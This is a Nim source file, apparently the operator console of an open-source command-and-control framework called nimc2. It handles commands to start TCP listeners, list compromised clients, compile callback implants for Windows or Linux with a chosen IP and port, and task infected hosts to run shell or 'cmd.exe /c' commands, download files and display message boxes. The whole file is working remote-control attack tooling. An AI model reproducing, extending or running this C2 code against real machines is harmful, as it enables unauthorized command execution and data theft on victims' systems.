import asyncdispatch, asyncnet, threadpool, asyncfutures
import strutils, terminal, osproc

import listeners/[tcp]
import communication
import ../utils

importCommands() # import ../commands/[shell, msgbox, download]
import types, logging

proc procStdin*(server: C2Server) {.async.} =
  var handlingClient: C2Client

  prompt(handlingClient, server)
  var messageFlowVar = spawn stdin.readLine()
  while true:
    if messageFlowVar.isReady():
      
      let input = ^messageFlowVar
      let args = input.split(" ")
      let argsn = len(args)
      let cmd = args[0]
      let a_args = args[1..(argsn - 1)].join(" ")

      case cmd:
        of "help":
            echo "-- Navigation"
            echo "  exit\twhy would you ever exit?"
            echo "  back\tgo back to main menu"
            echo "  interact [id]\tinteract with a client"
            echo "-- Listeners"
            echo "  startlistener [type] [..args]\tstart a listener"
            echo "  listeners\tshow a list of listeners"
            echo "  clientlisteners\tshow a list of listeners and their clients"
            echo "-- Implants"
            echo "  generateimplant [listener id] [platform]\tgenerate an implant (listener id e.g. tcp:0, tcp:1)"
            echo "-- Managing clients"
            echo "  clients\tview a list of clients"
            echo "  info\tget info about a client"
            echo "  shell [cmd]\trun a shell command"
            echo "  cmd [cmd]\trun a cmd command ('cmd.exe /c')"
            echo "  tmsgbox\tsend a message box"
            echo "-- More info"
            echo "  Checkout the wiki: "
        # implants

        of "generateimplant":
            if argsn >= 3:
                let args_split = args[1].split(":")
                var platform: string
                var ip: string
                var port: string
                if argsn == 3:
                    platform = args_split[0]
                    if platform == "tcp":
                        let listenerId = parseInt(args_split[1])
                        if len(server.tcpListeners) > listenerId:
                            let tcpListener = server.tcpListeners[listenerId]
                            infoLog "generating implant for " & $tcpListener
                            ip = tcpListener.listeningIP
                            port = $tcpListener.port
                            
                        else:
                            errorLog "couldn't find tcp listener"
                elif argsn == 5:
                    platform = args[4]
                    ip = args[2]
                    port = args[3]
                let exitCode = execCmd(
                    "nim c -d:client " &
                        "-d:ip=" & ip & " " & 
                        "-d:port=" & port & " " & 
                        (if platform == "windows": "-d:mingw" else: "--os:linux") & " " & 
                        "-o:implant" & (if platform == "windows": ".exe " else: " ") & 
                        "./src/client/client.nim")
                if exitCode != 0:
                    errorLog "failed to build implant. https://github.com/d4rckh/nimc2/wiki/FAQs"
                else:
                    infoLog "saved implant to implant" & (if platform == "windows": ".exe " else: " ") 
            else:
                errorLog "incorrect usage. Check https://github.com/d4rckh/nimc2/wiki/Usage#generating-an-implant"
        # listener management

        of "listeners":
            for tcpListener in server.tcpListeners:
                infoLog @tcpListener
            infoLog $len(server.tcpListeners) & " listeners"
        of "clientlisteners":
            for tcpListener in server.tcpListeners:
                infoLog @tcpListener
                for client in server.clients:
                    if client.listenerType == "tcp" and client.listenerId == tcpListener.id and client.connected:
                        infoLog "\t<- " & $client
            infoLog $len(server.tcpListeners) & " listeners"
        of "startlistener":
            if argsn >= 2:
                if args[1].toLower() == "tcp":
                    if argsn >= 4:
                        asyncCheck server.createNewTcpListener(parseInt(args[3]), args[2])
                    else:
                        echo "Bad usage, correct usage: startlistener TCP (ip) (port)"
            else:
                echo "You need to specify the type of listener you wanna start, supported: TCP"
        
        # clients management

        of "clients":
            for client in server.clients:
                if client.connected:
                    stdout.styledWriteLine fgGreen, "[+] ", $client, fgWhite
                else:
                    stdout.styledWriteLine fgRed, "[-] ", $client, fgWhite
            infoLog $len(server.clients) & " clients currently connected"
        of "info":
            echo @handlingClient

        # tasks management

        of "tasks":
            for task in server.tasks:
                echo $task.client & " <= " & $task

        # navigation
        
        of "interact":
            for client in server.clients:
                if client.id == parseInt(args[1]):
                    handlingClient = client
            if handlingClient.isNil() or handlingClient.id != parseInt(args[1]):
                infoLog "client not found"
        of "back": 
            handlingClient = nil
        of "exit":
            for tcpListener in server.tcpListeners:
                tcpListener.running = false
                tcpListener.socket.close()

        # client commands

        of "download":
            let task = await download.sendTask(handlingClient, args[1])
            await task.awaitResponse()
        of "shell":
            let task = await shell.sendTask(handlingClient, a_args)
            await task.awaitResponse()
        of "cmd":
            let task = await shell.sendTask(handlingClient, "cmd.exe /c " & a_args)
            await task.awaitResponse()
        of "msgbox":
            if argsn >= 3:
                let slashSplit = a_args.split("/")
                discard await msgbox.sendTask(handlingClient, slashSplit[1].strip(), slashSplit[0].strip())
            else:
                echo "wrong usage. msgbox (title) / (caption)"

            # quit(0)

      prompt(handlingClient, server)
      messageFlowVar = spawn stdin.readLine()
      
    await asyncdispatch.sleepAsync(100)
